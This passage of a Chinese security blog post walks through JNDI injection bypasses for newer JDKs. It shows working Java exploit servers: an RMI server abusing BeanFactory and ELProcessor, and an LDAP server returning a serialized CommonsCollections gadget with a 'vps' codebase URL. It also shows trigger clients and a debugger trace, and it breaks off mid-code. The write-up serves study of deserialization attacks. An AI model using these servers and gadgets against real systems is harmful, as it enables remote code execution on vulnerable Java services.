href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F</a> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-comment">// JNDI 高版本 jdk 绕过服务端  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJava</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil RMI Server is Listening on port: 1099&quot;</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry( <span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory</span><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>                                          <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// 强制将&#x27;x&#x27;属性的setter从&#x27;setX&#x27;变为&#x27;eval&#x27;, 详细逻辑见BeanFactory.getObjectInstance代码</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        <span class="hljs-comment">// 利用表达式执行命令</span><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;)&quot;</span> +<br>                                  <span class="hljs-string">&quot;.newInstance().getEngineByName(\&quot;JavaScript\&quot;)&quot;</span> +<br>                                  <span class="hljs-string">&quot;.eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>        System.out.println(<span class="hljs-string">&quot;[*]Evil command: calc&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Object&quot;</span>, referenceWrapper);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaServerRebind</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<br>                                                  <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span> );<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-string">&quot;Runtime.getRuntime().exe(&#x27;calc&#x27;)&quot;</span> ));<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, resourceRef);<br>        System.out.println(<span class="hljs-string">&quot;ServerRebind Success&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIBypassHighJavaClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://localhost:1099/Object&quot;</span>;<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115690.png"></p><h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>前面的流程还是进入 <code>lookup</code> 方法，到 <code>RegistryContext</code> 类的 <code>decodeObject()</code> 方法，这个方法当中调用了 <code>getObjectInstance()</code>。然后来到 <code>getObjectFactoryFromReference</code><font style="color:#080808;background-color:#ffffff;"> 开始跟：</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242115373.png"></p><p>然后通过 loadClass 加载 <code>org.apache.naming.factory.BeanFactory</code><font style="color:#080808;background-color:#ffffff;">并赋值给 clas </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117328.png"></p><p><font style="color:#080808;background-color:#ffffff;">将 clas 强转为 </font><strong><font style="color:#080808;background-color:#ffffff;">ObjectFactory  </font></strong><font style="color:#080808;background-color:#ffffff;">类型</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117362.png"></p><p>然后经过一系列复杂的赋值，最终在 ref 的 className 中获取到了 “javax.el.ELProcessor” ，classFactory 获取到了”org.apache.naming.factory.BeanFactory”</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117627.png"></p><p><strong>getObjectInstance</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117347.png"></p><p>到了 getObjectInstance 之后便是整理变量，准备执行 invoke 方法</p><p>ra  通过利用 Java 的脚本引擎（JavaScript ）在运行时构造并调用 <code>ProcessBuilder</code>，最终在目标主机上执行系统命令 <code>calc</code>，就是获取 beanClass 即 <code>javax.el.ELProcessor</code> 类的 eval() 方法并和 x 属性</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118019.png"></p><p>可以看到这里的一个 value 中封装的就是恶意代码</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242117409.png"></p><p>最终代码在 method.invoke 处，<font style="color:rgb(80, 80, 92);">通过method.invoke()即反射调用的来执行</font><br><code>&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;calc&#39;]).start()&quot;)</code>。弹出计算器。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118772.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242118088.png"></p><h4 id="绕过二：LDAP返回序列化数据，触发本地Target"><a href="#绕过二：LDAP返回序列化数据，触发本地Target" class="headerlink" title="绕过二：LDAP返回序列化数据，触发本地Target"></a>绕过二：<font style="color:rgb(33, 53, 71);">LDAP返回序列化数据，触发本地Target</font></h4><blockquote><p>LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的<code>obj.decodeObject()</code> 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。</p></blockquote><h5 id="复现：-1"><a href="#复现：-1" class="headerlink" title="复现："></a><font style="color:rgb(80, 80, 92);">复现：</font></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.80<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.util.Base64;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vps:8000/#ExportObject&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            <span class="hljs-comment">// Payload1: 利用LDAP+Reference Factory  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><br>            <span class="hljs-comment">// Payload2: 返回序列化Gadget</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;<br>                exception.printStackTrace();<br>            &#125;<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// lookup参数注入触发  </span><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);<br><br>        <span class="hljs-comment">// Fastjson反序列化JNDI注入Gadget触发</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span 